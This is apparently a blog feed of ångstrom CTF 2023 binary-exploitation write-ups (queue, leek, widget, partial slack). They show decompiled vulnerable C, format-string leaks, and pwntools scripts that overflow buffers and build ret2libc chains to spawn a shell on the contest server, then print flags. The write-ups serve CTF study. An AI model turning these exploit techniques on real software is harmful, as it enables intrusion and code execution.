class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actf&#123;b4by&#x27;s_f1rst_pwn!_3857ffd6bfdf775e&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> angstrom </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ångstrom CTF 2023 - queue (fsb, flag leak)</title>
      <link href="/230427-angstromctf2023-1.queue/"/>
      <url>/230427-angstromctf2023-1.queue/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1859">https://ctftime.org/event/1859</a></li></ul><blockquote><p>I just learned about stacks and queues in DSA!<br><code>nc challs.actf.co 31322</code></p></blockquote><ul><li>[333 solves &#x2F; 40 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__gid_t</span> rgid; <span class="comment">// [rsp+4h] [rbp-CCh]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-C8h]</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">48</span>]; <span class="comment">// [rsp+10h] [rbp-C0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">136</span>]; <span class="comment">// [rsp+40h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+C8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  rgid = getegid();</span><br><span class="line">  setresgid(rgid, rgid, rgid);</span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error: missing flag.txt.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">128</span>, stream);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What did you learn in class today? &quot;</span>);</span><br><span class="line">  fgets(format, <span class="number">48</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Oh nice, &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);   <span class="comment">// fsb</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;sounds pretty cool!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v9 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I find simple <code>fsb</code> vulnerability. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[jir4vvit@<span class="built_in">arch</span> 1.queue]$ nc challs.actf.co 31322</span><br><span class="line">What did you learn <span class="keyword">in</span> class today? %14<span class="variable">$p</span> %15<span class="variable">$p</span> %16<span class="variable">$p</span> %17<span class="variable">$p</span> %18<span class="variable">$p</span> %19<span class="variable">$p</span> %20<span class="variable">$p</span></span><br><span class="line">Oh <span class="built_in">nice</span>, 0x3474737b66746361 0x75715f74695f6b63 0x615f74695f657565 0x3437396461393136 0x7d32326234363863 (nil) (nil)</span><br></pre></td></tr></table></figure><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Solve-Code"><a href="#Solve-Code" class="headerlink" title="Solve Code"></a>Solve Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">0x3474737b66746361</span>, <span class="number">0x75715f74695f6b63</span>, <span class="number">0x615f74695f657565</span>, <span class="number">0x3437396461393136</span>, <span class="number">0x7d32326234363863</span>]</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    l = <span class="built_in">hex</span>(l)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">16</span>,<span class="number">2</span>):</span><br><span class="line">        f = l[-i-<span class="number">1</span>]+l[-i]</span><br><span class="line">        f = <span class="built_in">int</span>(f, <span class="number">16</span>)</span><br><span class="line">        flag.append(<span class="built_in">chr</span>(f))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actf&#123;st4ck_it_queue_it_a619ad974c864b22&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> angstrom </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ångstrom CTF 2023 - leek (heap overflow)</title>
      <link href="/230427-angstromctf2023-3.leek/"/>
      <url>/230427-angstromctf2023-3.leek/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1859">https://ctftime.org/event/1859</a></li></ul><blockquote><p><code>nc challs.actf.co 31310</code><br>Author: JoshDaBosh</p></blockquote><ul><li>[143 solves &#x2F; 100 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+4h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">__gid_t</span> rgid; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *heap_addr; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="type">void</span> *heap_random; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">40</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  rgid = getegid();</span><br><span class="line">  setresgid(rgid, rgid, rgid);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I dare you to leek my secret.&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; N; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    heap_addr = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">    heap_random = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="built_in">memset</span>(heap_random, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">    getrandom();</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">31</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*((_BYTE *)heap_random + j) || *((_BYTE *)heap_random + j) == <span class="number">10</span> )</span><br><span class="line">        *((_BYTE *)heap_random + j) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your input (NO STACK BUFFER OVERFLOWS!!): &quot;</span>);</span><br><span class="line">    input(heap_addr);                           <span class="comment">// heap overflow</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;:skull::skull::skull: bro really said: &quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(heap_addr);                            <span class="comment">// print</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;So? What&#x27;s my secret? &quot;</span>);</span><br><span class="line">    fgets(s2, <span class="number">33</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strncmp</span>((<span class="type">const</span> <span class="type">char</span> *)heap_random, s2, <span class="number">0x20</span>uLL) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Okay, I&#x27;ll give you a reward for guessing it.&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Say what you want: &quot;</span>);</span><br><span class="line">    gets(heap_addr);    <span class="comment">// bof</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hmm... I changed my mind.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(heap_random);</span><br><span class="line">    <span class="built_in">free</span>(heap_addr);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Next round!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Looks like you made it through.&quot;</span>);</span><br><span class="line">  win();</span><br><span class="line">  <span class="keyword">return</span> v12 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I can find <code>heap overflow</code> in <code>memcpy</code> of <code>input()</code>. And then, There are second <code>bof</code> in <code>heap</code> from <code>gets()</code>. At that time, I should have understanding the structure of <code>heap</code>. If the structure of <code>heap</code> is destroyed, I’ll be meet <code>Double free</code> vulnerability. (This will be caused by recognizing the <code>heap</code> as one.)</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./leek&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;challs.actf.co&#x27;</span>, <span class="number">31310</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./leek&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x64</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">64</span></span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;): &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">32</span></span><br><span class="line"></span><br><span class="line">    p.sendafter(<span class="string">&#x27;secret? &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">16</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">0x31</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">16</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;want: &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actf&#123;very_133k_of_y0u_777522a2c32b7dd6&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> angstrom </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ångstrom CTF 2023 - widget (fsb, bof)</title>
      <link href="/230427-angstromctf2023-4.widget/"/>
      <url>/230427-angstromctf2023-4.widget/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1859">https://ctftime.org/event/1859</a></li></ul><blockquote><p>I seem to have lost my gadgets.<br><code>nc challs.actf.co 31320</code><br>Author: JoshDaBosh</p></blockquote><ul><li>[116 solves &#x2F; 110 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">__gid_t</span> rgid; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  rgid = getegid();</span><br><span class="line">  setresgid(rgid, rgid, rgid);</span><br><span class="line">  <span class="keyword">if</span> ( called )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  called = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Amount: &quot;</span>);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Contents: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, v4);                             <span class="comment">// bof</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="type">int</span>)i &lt; v4; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( buf[i] == <span class="string">&#x27;n&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;bad %d\n&quot;</span>, i);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your input: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(buf);                           <span class="comment">// fsb</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I can find <code>fsb</code> vulnerability. But I can’t use <code>n</code> format string. I can only leak the stack address. But I can overwrite return address because of <code>bof</code> vulnerability. I can adjust input size.</p><p>I can find <code>win()</code> also.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">win</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">136</span>]; <span class="comment">// [rsp+10h] [rbp-90h] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(a1, <span class="string">&quot;14571414c5d9fe9ed0698ef21065d8a6&quot;</span>, <span class="number">0x20</span>uLL) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(a2, <span class="string">&quot;willy_wonka_widget_factory&quot;</span>, <span class="number">0x1A</span>uLL) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error: missing flag.txt.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">128</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This <code>win()</code> needs arguments to call. But I was not use this function. I can get libc’s address, So I can easily run the <code>system()</code>.</p><p>If you use this trick, It is important <code>rbp</code> have to in valid address.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li>leak the libc’s address and ret2main</li><li>ret2libc (<code>system</code>)</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">main2 = <span class="number">0x4013E3</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./widgetp&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;challs.actf.co&#x27;</span>, <span class="number">31320</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./widgetp&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;proof of work: &#x27;</span>)</span><br><span class="line"><span class="comment"># print( repr( subprocess.check_output([&#x27;bash&#x27;, &#x27;-c&#x27;, p.recvline()]) ))</span></span><br><span class="line">p.send(subprocess.check_output([<span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, p.recvline()]))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># payload += b&#x27;AAAAAAAA&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%3$p\n&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x404800</span>)</span><br><span class="line"><span class="comment"># payload += p64(ret)</span></span><br><span class="line">payload += p64(main2)</span><br><span class="line"><span class="comment"># payload += p64(0x401296)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>) - <span class="number">0x114a37</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi = <span class="number">0x2be51</span></span><br><span class="line">ret = <span class="number">0x29cd6</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span>)</span><br><span class="line">payload += p64(<span class="number">0x40402C</span>)</span><br><span class="line"><span class="comment"># payload += p64(0x12345678)</span></span><br><span class="line">payload += p64(pop_rdi + libc.address)</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(ret + libc.address)</span><br><span class="line">payload += p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actf&#123;y0u_f0und_a_usefu1_widg3t!_30db5c45a07ac981&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> angstrom </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ångstrom CTF 2023 - slack (fsb)</title>
      <link href="/230427-angstromctf2023-5.slack/"/>
      <url>/230427-angstromctf2023-5.slack/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1859">https://ctftime.org/event/1859</a></li></ul><blockquote><p>Join the ångstromCTF slack!<br><code>nc challs.actf.co 31500</code><br>Author: JoshDaBosh</p></blockquote><ul><li>[64 solves &#x2F; 140 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 